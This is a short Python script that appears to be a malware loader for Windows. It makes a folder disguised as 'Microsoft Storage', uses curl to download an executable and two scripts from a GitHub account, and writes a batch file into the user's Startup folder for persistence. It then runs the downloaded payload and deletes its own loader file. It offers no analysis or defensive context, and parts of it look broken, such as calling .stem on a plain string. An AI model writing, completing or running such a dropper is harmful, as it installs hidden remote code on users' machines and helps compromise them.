import os
import sys
from pathlib import Path
import time

directory = "C:/ProgramData/Microsoft Storage"
os.makedirs(directory, exist_ok=True)
os.chdir(directory)


os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/clo.exe")
os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/file.py")
os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/startup.py")

startup_folder = Path(os.path.expanduser("~")) / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
startup_folder.mkdir(parents=True, exist_ok=True)
    
current_file = "C:/ProgramData/Microsoft Storage/startup.py"
    
bat_content = fr'@echo off\n"{sys.executable}" "{current_file}"\n'
bat_path = startup_folder / f"{current_file.stem}.bat"
    
with open(bat_path, 'w', encoding='utf-8') as f:
        f.write(bat_content)

os.system("start C:/ProgramData/Microsoft Storage/startup.py")
time.sleep(1)
os.remove("C:/ProgramData/Microsoft Storage/loader.py")
